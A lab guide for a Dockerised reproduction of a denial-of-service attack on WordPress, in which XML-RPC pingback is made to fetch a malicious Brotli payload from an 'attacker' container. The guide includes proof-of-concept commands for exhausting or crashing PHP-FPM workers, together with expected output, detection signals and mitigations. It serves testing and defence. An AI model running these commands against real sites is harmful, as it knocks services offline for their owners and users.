# Lab guide

## Services

| Service | Image | Port |
|---|---|---|
| `db` | `mariadb:11.4` | — |
| `wordpress` | official `wordpress:php8.3-fpm` (pinned digest) | — |
| `nginx` | `nginx:1.27-alpine` | `8080` |
| `attacker` | built from `lab/attacker` | `8081` |
| `wp-init` | `wordpress:cli` | — |

```text
WordPress  http://localhost:8080
xmlrpc     http://localhost:8080/xmlrpc.php
payload    http://localhost:8081/health
admin      http://localhost:8080/wp-admin/  (admin / admin)
```

The WordPress image is stock except for a 10-line mu-plugin that allowlists
the Docker-internal `attacker` hostname. The PHP-FPM pool is the stock
`www.conf`: `pm = dynamic`, `pm.max_children = 5`, no
`request_terminate_timeout`.

## Start

```bash
cp .env.example .env
make up
make probe
make verify
```

`make up` builds the lab and runs the idempotent WordPress installer.
`make verify` checks the PHP/curl/Brotli stack with a 6-second behavioural
test against `/small.br`.

## Modes

```bash
# Is pingback exposed?
python3 poc/pingback_poc.py --target http://localhost:8080 --mode probe

# 86-byte hang: one worker at 100% CPU
make hang

# 23 MB crash: one SIGSEGV
make crash

# Recover immediately from stuck workers
make restart
```

`make hang` prints a client timeout and leaves one worker spinning. The stock
FPM config has no request timeout, but `max_execution_time = 30` ends the
request with exit code 124 after ~30 seconds. `make restart` is faster.

`make crash` prints an HTTP 502 and a SIGSEGV in the log. One request is
enough. To exhaust the default five-worker pool:

```bash
python3 poc/pingback_poc.py --target http://localhost:8080 --mode crash \
  --payload-url http://attacker:8080/payload.br --workers 5 --show-logs
```

Five hangs (`--mode hang --workers 5`) occupy all workers for up to ~30
seconds; `make restart` recovers immediately.

## Expected output

Crash:

```text
[1] <- HTTP 502 in 2.7s
    crashed    1
[!] attack signal observed
[*] php-fpm log
    WARNING: [pool www] child 10 exited on signal 11 (SIGSEGV - core dumped)
```

Hang:

```text
[1] <- timeout after 12.0s
    hung       1
[!] attack signal observed
[*] site after : HTTP 200 in 0.0s
[*] stock FPM has no request timeout; max_execution_time ends a
    stuck worker in ~30s. Use `make restart` to recover now.
```

```bash
docker stats --no-stream --format '{{.Name}} cpu={{.CPUPerc}}' \
  $(docker compose ps -q wordpress)
# brotli-pingback-lab-wordpress-1 cpu=99.29%
```

## Logs

```bash
make logs
docker compose logs wordpress | grep -E 'SIGSEGV|signal 11|code 124'
```

The php-fpm master logs child exits even with the stock config. Worker stdout
is not captured by default; use `catch_workers_output = yes` if you need it.

## Detect and mitigate

Detection:

* `POST /xmlrpc.php` ending in 502/504 after several seconds;
* an outbound fetch from the web tier to a new/short-lived host;
* a worker at 100% CPU without a PHP error;
* `child ... exited on signal 11 (SIGSEGV)` or `exited with code 124`;
* a 20+ MB outbound response to the web tier.

Mitigation:

* patch Brotli (1.0.10 / 1.1.1 / 1.2.1) and every runtime that embeds it;
* disable or restrict XML-RPC/pingback if unused;
* restrict egress from the web tier to an allowlist;
* reject or decode `Content-Encoding: br` from untrusted peers at a patched
  proxy;
* set `request_terminate_timeout`, `pm.max_children`, and `pm.max_requests`;
* the 150 KB pingback cap is not a fix.

## Troubleshooting

**`make probe` cannot find `pingback.ping`** — XML-RPC is disabled or nginx
does not pass `/xmlrpc.php` to PHP-FPM. The lab image has no plugins.

**`make crash` returns a fault instead of 502** — WordPress could not fetch
the payload. Check `curl http://localhost:8081/health`, the `attacker` host,
and the mu-plugin. The 23 MB transfer must finish within the 10-second
pingback timeout.

**No SIGSEGV in the log** — run `make verify`. If the decoder is patched, the
stream is rejected and Requests retries without decoding. Rebuild on the
pinned image digest.

**No SIGSEGV after a config change** — the crash tail is specific to the
x86-64 `BrotliDecoderState` layout of Brotli 1.1.0/1.2.0. It is tested on the
pinned image.

**Ports in use** — change `WP_PORT` / `ATTACKER_PORT` in `.env`, then
`make up`.

## Limits

* Local lab only; the payload server is not a public service.
* The 23 MB transfer must preserve the chunk boundary; a buffering or
  `br`-decoding proxy will neutralize it.
* No RCE is attempted or provided.
